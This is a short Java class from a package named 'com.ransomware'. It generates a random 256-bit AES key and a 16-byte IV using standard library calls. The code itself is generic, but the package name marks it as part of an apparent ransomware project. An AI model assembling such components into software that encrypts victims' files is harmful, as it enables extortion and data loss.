package com.ransomware;

import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class KeyIvLogic {
	public static byte [] getKey() throws NoSuchAlgorithmException {
		KeyGenerator keyGen = KeyGenerator.getInstance("AES");
		keyGen.init(256); // for example
		return keyGen.generateKey().getEncoded();
	}
	
	public static byte [] getIv() throws NoSuchAlgorithmException{
		SecureRandom random = new SecureRandom();
		byte[] iv = new byte[16];
		random.nextBytes(iv);
		return iv;
	}
}
